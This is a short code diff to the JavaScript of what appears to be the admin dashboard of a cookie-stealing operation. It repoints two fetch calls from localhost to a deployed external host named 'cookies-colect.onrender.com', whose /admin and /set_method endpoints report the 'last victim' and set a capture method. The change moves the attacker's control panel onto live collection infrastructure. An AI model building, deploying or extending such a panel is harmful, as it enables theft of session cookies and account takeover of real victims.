@@ -75,7 +75,7 @@
     <script>
         async function refreshData() {
             try {
-                const response = await fetch('http://localhost:5000/admin');
+                const response = await fetch('https://cookies-colect.onrender.com/admin');
                 const data = await response.json();
                 
                 // Update last victim
@@ -119,7 +119,7 @@
             const statusMsg = document.getElementById('statusMsg');
             
             try {
-                await fetch('http://localhost:5000/set_method', {
+                await fetch('https://cookies-colect.onrender.com/set_method', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ method: method })
